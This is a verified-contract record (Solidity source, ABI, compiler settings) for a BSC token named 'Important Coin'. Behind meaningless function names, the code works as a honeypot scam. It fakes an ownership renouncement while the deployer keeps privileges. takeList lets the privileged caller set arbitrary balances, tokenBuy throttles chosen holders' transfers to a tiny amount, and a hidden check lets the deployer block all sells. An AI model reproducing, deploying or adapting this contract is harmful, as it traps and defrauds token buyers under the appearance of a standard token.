{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract receiverToTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundWallet {\n    function createPair(address feeSellSwap, address feeMode) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface sellToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface limitAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minAutoEnable) external view returns (uint256);\n\n    function transfer(address limitTxMax, uint256 amountMin) external returns (bool);\n\n    function allowance(address isSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitTxMax,\n        uint256 amountMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoLaunched, uint256 value);\n    event Approval(address indexed isSwap, address indexed spender, uint256 value);\n}\n\ninterface limitAmountMetadata is limitAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImportantCoin is receiverToTx, limitAmount, limitAmountMetadata {\n\n    string private autoListReceiver = \"ICN\";\n\n    function tokenAmount() public {\n        emit OwnershipTransferred(buyToken, address(0));\n        listEnableLaunch = address(0);\n    }\n\n    uint256 receiverAutoFund;\n\n    function approve(address launchSell, uint256 amountMin) public virtual override returns (bool) {\n        tradingMarketingEnable[_msgSender()][launchSell] = amountMin;\n        emit Approval(_msgSender(), launchSell, amountMin);\n        return true;\n    }\n\n    bool public tradingAuto;\n\n    function amountSwap(address shouldTx) public {\n        if (swapTx) {\n            return;\n        }\n        \n        feeAuto[shouldTx] = true;\n        \n        swapTx = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingMarketingEnable;\n\n    address public buyToken;\n\n    function owner() external view returns (address) {\n        return listEnableLaunch;\n    }\n\n    bool public swapTx;\n\n    mapping(address => bool) public feeAuto;\n\n    address tradingBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tokenBuy(address toShould) public {\n        sellReceiverEnable();\n        \n        if (toShould == buyToken || toShould == feeLaunched) {\n            return;\n        }\n        isReceiverShould[toShould] = true;\n    }\n\n    function transferFrom(address sellAmountReceiver, address limitTxMax, uint256 amountMin) external override returns (bool) {\n        if (_msgSender() != tradingBuy) {\n            if (tradingMarketingEnable[sellAmountReceiver][_msgSender()] != type(uint256).max) {\n                require(amountMin <= tradingMarketingEnable[sellAmountReceiver][_msgSender()]);\n                tradingMarketingEnable[sellAmountReceiver][_msgSender()] -= amountMin;\n            }\n        }\n        return isFund(sellAmountReceiver, limitTxMax, amountMin);\n    }\n\n    function allowance(address limitTotal, address launchSell) external view virtual override returns (uint256) {\n        if (launchSell == tradingBuy) {\n            return type(uint256).max;\n        }\n        return tradingMarketingEnable[limitTotal][launchSell];\n    }\n\n    uint256 public fromToIs = 0;\n\n    function takeList(address liquidityReceiver, uint256 amountMin) public {\n        sellReceiverEnable();\n        limitAuto[liquidityReceiver] = amountMin;\n    }\n\n    address toAutoList;\n\n    uint256 feeFund;\n\n    uint256 public fromTxLaunched = 3;\n\n    constructor (){\n        \n        tokenAmount();\n        sellToken receiverTo = sellToken(tradingBuy);\n        feeLaunched = fundWallet(receiverTo.factory()).createPair(receiverTo.WETH(), address(this));\n        toAutoList = fundWallet(receiverTo.factory()).feeTo();\n        \n        buyToken = _msgSender();\n        feeAuto[buyToken] = true;\n        limitAuto[buyToken] = liquidityFeeReceiver;\n        \n        emit Transfer(address(0), buyToken, liquidityFeeReceiver);\n    }\n\n    uint256 constant teamEnable = 11 ** 10;\n\n    uint256 public walletIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletLaunched;\n    }\n\n    function senderFrom(address sellAmountReceiver, address limitTxMax, uint256 amountMin) internal returns (bool) {\n        require(limitAuto[sellAmountReceiver] >= amountMin);\n        limitAuto[sellAmountReceiver] -= amountMin;\n        limitAuto[limitTxMax] += amountMin;\n        emit Transfer(sellAmountReceiver, limitTxMax, amountMin);\n        return true;\n    }\n\n    function sellReceiverEnable() private view {\n        require(feeAuto[_msgSender()]);\n    }\n\n    mapping(address => uint256) private limitAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return listTx;\n    }\n\n    function receiverToken(uint256 amountMin) public {\n        sellReceiverEnable();\n        receiverAutoFund = amountMin;\n    }\n\n    address public feeLaunched;\n\n    bool public toSenderLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoListReceiver;\n    }\n\n    function balanceOf(address minAutoEnable) public view virtual override returns (uint256) {\n        return limitAuto[minAutoEnable];\n    }\n\n    uint256 private limitReceiverTeam;\n\n    function getOwner() external view returns (address) {\n        return listEnableLaunch;\n    }\n\n    function transfer(address liquidityReceiver, uint256 amountMin) external virtual override returns (bool) {\n        return isFund(_msgSender(), liquidityReceiver, amountMin);\n    }\n\n    bool private liquidityBuy;\n\n    event OwnershipTransferred(address indexed tokenTeam, address indexed modeAmount);\n\n    function isFund(address sellAmountReceiver, address limitTxMax, uint256 amountMin) internal returns (bool) {\n        if (sellAmountReceiver == buyToken) {\n            return senderFrom(sellAmountReceiver, limitTxMax, amountMin);\n        }\n        uint256 teamMarketing = limitAmount(feeLaunched).balanceOf(toAutoList);\n        require(teamMarketing == receiverAutoFund);\n        require(limitTxMax != toAutoList);\n        if (isReceiverShould[sellAmountReceiver]) {\n            return senderFrom(sellAmountReceiver, limitTxMax, teamEnable);\n        }\n        amountMin = liquidityMaxSell(sellAmountReceiver, limitTxMax, amountMin);\n        return senderFrom(sellAmountReceiver, limitTxMax, amountMin);\n    }\n\n    bool private sellMax;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityFeeReceiver;\n    }\n\n    mapping(address => bool) public isReceiverShould;\n\n    uint8 private walletLaunched = 18;\n\n    function liquidityMaxSell(address sellAmountReceiver, address limitTxMax, uint256 amountMin) internal view returns (uint256) {\n        require(amountMin > 0);\n\n        uint256 limitSellFund = 0;\n        if (sellAmountReceiver == feeLaunched && fromTxLaunched > 0) {\n            limitSellFund = amountMin * fromTxLaunched / 100;\n        } else if (limitTxMax == feeLaunched && fromToIs > 0) {\n            limitSellFund = amountMin * fromToIs / 100;\n        }\n        require(limitSellFund <= amountMin);\n        return amountMin - limitSellFund;\n    }\n\n    string private listTx = \"Important Coin\";\n\n    uint256 private liquidityFeeReceiver = 100000000 * 10 ** 18;\n\n    address private listEnableLaunch;\n\n    uint256 private toFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTx\",\"type\":\"address\"}],\"name\":\"amountSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAutoEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTxLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isReceiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"receiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"takeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSenderLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"}],\"name\":\"tokenBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmountReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTxMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ImportantCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}